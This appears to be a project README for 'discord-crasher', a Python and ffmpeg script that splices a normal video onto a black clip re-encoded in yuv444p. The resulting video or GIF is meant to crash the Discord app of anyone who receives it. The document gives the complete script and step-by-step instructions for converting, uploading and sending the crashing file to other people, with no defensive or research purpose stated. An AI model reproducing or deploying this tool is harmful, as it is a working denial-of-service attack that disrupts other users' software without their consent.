# discord-crasher

***CREATES DISCORD VIDEOS THAT CAN CRASH DISCORD***

***TO CONVERT FROM MP4 TO GIF***

<a href="https://gfycat.com/create">CLICK ME</a>

`
DO NOT ADD TAGS JUST UPLOAD THE GIF AND CLICK CONTINUE  TILL ITS
UPLOADED THEN OPEN THE GIF IN NEW TAB AND COPY THE LINK OR INSTALL
`

```
Discord Crasher
This script will make a video with ffmpeg that will be able to crash peoples discords
you can later convert it to a .gif file so it will instacrash when you send the gif ^^`
```

```
Files that will be there sinse the beggining:
black.mp4 //need it for later as the second video (will be renamed to new-vid.mp4)
video.mp4 //will be the first video show in the gif / video that will be the crasher.mp4`
```

```
These files will be created and deleted when the script finishes:
new-vid.mp4 //black.mp4 wont be deleted
code.txt //will be used later
```

```
so you have for example black.mp4 (this will be forever there as the second video)like (first video then the second video starts playing its useless(second video)) so you leave it as black.mp4 its a black 10 secs vid
```

```
first comes this part of the code which asks for the name of the video.mp4 that will be the first video in the gif / video that will be crashing.
it also executes this ffmpeg -i black.mp4 -pix_fmt yuv444p new-vid.mp4
//firstf is input of the first video (the first video that will be played at the beggining of the crashing video / gif you will have)
```

```
print(" ")
print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
firstf = input(f"""    {Fore.BLUE }${Fore.RESET} Video => """) //remember this for later
print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
os.system(f"""ffmpeg -i black.mp4 -pix_fmt yuv444p new-vid.mp4""")
print(" ")
print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
```

```
then it uses this to write to the code.txt file which you willl need it later :
print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
open("code.txt", "w").close()
file = open("code.txt","w") 
file.write(f"""file {firstf}\n""")
file.write(f"""file new-vid.mp4""")
file.close()
print(" ")
print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
```

```
The code:

import subprocess
import glob
from colorama import Fore, Back, Style
import os
import sys

def clear():
    os.system("clear;cls")
    
def blank():
    print(" ")

def blocks():
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    
def main():
    blank()
    blocks()
    firstf = input(f"""    {Fore.BLUE }${Fore.RESET} Video => """)
    blocks()
    os.system(f"""ffmpeg -i black.mp4 -pix_fmt yuv444p new-vid.mp4""")
    blank()
    blocks()
    open("code.txt", "w").close()
    file = open("code.txt","w") 
    file.write(f"""file {firstf}\n""")
    file.write(f"""file new-vid.mp4""")
    file.close()
    blank()
    blocks()
    os.system("ffmpeg -f concat -i code.txt -codec copy crasher.mp4")
    os.system("rm -rf code.txt")
    os.system("rm -rf new-vid.mp4")
    os.system("clear")
    clear()
clear()
main()
```

```
Files you will need to have (same directory):

main.py
black.mp4 (will always be there !!!dont remove it!!!)
video.mp4(or whatever name your vid is(example: part1.mp4)) (first part of video crasher / gif)
```

```
Stuff you need to install for the python script to work:

1. colorama
2. ffmpeg

```
